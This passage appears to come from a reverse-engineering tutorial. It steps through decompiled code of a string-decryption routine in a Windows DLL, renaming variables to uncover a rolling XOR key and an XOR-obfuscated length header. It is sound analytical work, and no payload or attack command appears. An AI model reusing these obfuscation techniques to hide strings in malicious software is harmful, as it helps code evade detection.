<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> a1, <span style="color:#ff79c6">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    sub_180008EE4(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> sub_180008EE4(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> a2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the function <code>sub_18000ACC8()</code> accepts two arguments: <code>a1</code> (encrypted data) and <code>a2</code> (decrypted string). let&rsquo;s rename these arguments so we can get a better picture of what&rsquo;s going on.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    sub_180008EE4(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> sub_180008EE4(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>let&rsquo;s examine the function <code>sub_180008EE4()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_180008EE4</span>(<span style="color:#8be9fd">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>this function seems to just be incrementing a value that is passed to it, so i can rename it as <code>increment_value()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> increment_value(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>okay, so we&rsquo;re getting closer to figuring out how this cipher function works.</p>
<p>let&rsquo;s take a look at the next line.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p>this line takes the first 4 bytes of the memory address that&rsquo;s pointed to by <code>encrypted_string</code> and interprets them as a 4B [32-bit] integer.</p>
<p>basically, the memory address of <code>encrypted_string</code> is cast to a pointer, to a 32-bit integer, and then <code>*</code> retrieves the actual 32-bit value [first 4 bytes] stored at that address. this retrieved value is then stored in the variable <code>v6</code>.</p>
<p>the value of <code>v6</code> is set at the start, so it&rsquo;s clearly important. it&rsquo;s then passed to <code>increment_value(v6)</code> inside the loop, meaning it&rsquo;s being updated or altered for each iteration.</p>
<p>as mentioned earlier, the core of XOR ciphers involves XOR-ing each byte of the plaintext (or encrypted text) with a <strong>key</strong>. check out the following line, that shows an XOR operation between <code>v6</code> and <code>v3</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span></code></pre></div><p>the XOR operation <code>v6 ^ v3</code> produces the decrypted string, which implies that <code>v6</code> is actually the <strong>XOR key</strong>. this is supported by the fact that <code>v6</code> is modified within each iteration of the loop, meaning that the key is being dynamically adjusted as each byte of <code>encrypted_string</code> is processed. [note: this is a common operation in encryption schemes where a rolling or changing key is used for each byte!]</p>
<p>we now have another variable name, and it&rsquo;s an important one! let&rsquo;s rewrite the function again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the <code>xor_key</code> starts at the start of the <code>encrypted_string</code>.</p>
<p>the length of the decrypted string is then calculated. it appears to be calculated by <code>XOR</code>-ing the first byte of the encrypted data with the fifth byte.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p>if you recall that the encrypted data appeared as the argument <code>unk_18000FA00</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>sub_18000ACC8((<span style="color:#ff79c6">__int64</span>)<span style="color:#ff79c6">&amp;</span>unk_18000FA00, (<span style="color:#ff79c6">__int64</span>)v9);
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/image-5.png" alt="memory contents"  />
</p>
</p>
<p>examining the memory contents of <code>unk_18000FA00</code> show that the first byte is <code>20h</code> and the fifth byte is <code>30h</code>, so <code>20h ^ 30h</code> gives the length of the decrypted data. the calculation is simple, and can be performed using the python CLI.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#bd93f9">0x20</span> <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x30</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">16</span>
</span></span></code></pre></div><p>in this specific case, the length of the decrypted string is 16. let&rsquo;s rename the variables to make it more readable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>decrypted_string_len <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> (<span style="color:#ff79c6">*</span>_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p><code>v5</code> also appears at the start of the loop, and it represents the upper limit of the loop (i.e. the loop runs <code>v5</code> times). from this, we can deduce that <code>v5</code> represents the number of iterations needed to process the entire <code>encrypted_string</code>.</p>
<p>so: the loop iterates <code>v5</code> times, processes <code>v5</code> bytes from <code>encrypted_string</code>, and writes <code>v5</code> bytes to <code>decrypted_string</code>. <code>v5</code> then must represent the number of bytes that the entire function needs to process, and this number of bytes corresponds to the length of <code>decrypted_string</code>.</p>
<p>but why the <code>XOR</code>?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span></code></pre></div><p>this might be a way for the function to either obfuscate or verify the length of the data. for example, maybe the length of the encrypted data could be stored in <code>encrypted_string</code> in an obfuscated way to prevent easy detection by reversing simple length indicators? i&rsquo;m not sure.</p>
<p>armed with another variable name, we&rsquo;re closer to deciphering the function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> decrypted_string_length; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    decrypted_string_length <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)decrypted_string_length; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>next, let&rsquo;s take a look at the first appearance of <code>v8</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span></code></pre></div><p><code>v8</code> is set to point to the memory address that is 6 bytes beyond the start of <code>encrypted_string</code>. i would suppose that the first 6 bytes of <code>encrypted_string</code> are used for storing metadata, like the XOR key and length, and so <code>v8</code> is supposed to point to the actual data that needs to be decrypted.</p>
<p><code>v8</code> also appears in the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span></code></pre></div><p>could <code>v8</code> be the base address for accessing the encrypted data within the loop? the line looks like it accesses a byte of the encrypted data by adding the loop index <code>i</code> to <code>v8</code>, meaning <code>v8</code> marks the start point of the encrypted portion of <code>encrypted_string</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> decrypted_string_length; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> start_index_encrypted_string; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    decrypted_string_length <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    start_index_encrypted_string <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)decrypted_string_length; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(start_index_encrypted_string <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
